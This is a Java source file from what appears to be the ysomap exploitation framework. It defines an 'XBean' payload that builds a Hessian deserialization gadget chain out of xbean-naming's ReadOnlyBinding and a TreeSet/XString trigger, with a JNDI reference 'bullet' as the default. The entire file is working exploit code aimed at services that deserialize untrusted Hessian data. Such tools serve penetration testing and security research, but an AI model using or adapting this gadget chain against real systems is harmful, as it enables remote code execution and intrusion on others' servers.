package ysomap.payloads.hessian;

import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.JNDIRefBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.naming.Context;

/**
 * @author wh1t3p1g
 * @since 2021/8/5
 */
@Payloads
@Authors({ Authors.MBECHLER })
@Targets({Targets.HESSIAN})
@Require(bullets = {"JNDIRefBullet","TomcatRefBullet"},param = false)
@Dependencies({"org.apache.xbean:xbean-naming:4.20"})
public class XBean extends HessianPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JNDIRefBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Context ctx = ReflectionHelper.createWithoutConstructor(WritableContext.class);
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", obj, ctx);
        ReflectionHelper.setFieldValue(binding, "boundObj", null);
        return PayloadHelper.makeTreeSetWithXString(binding);
    }
}
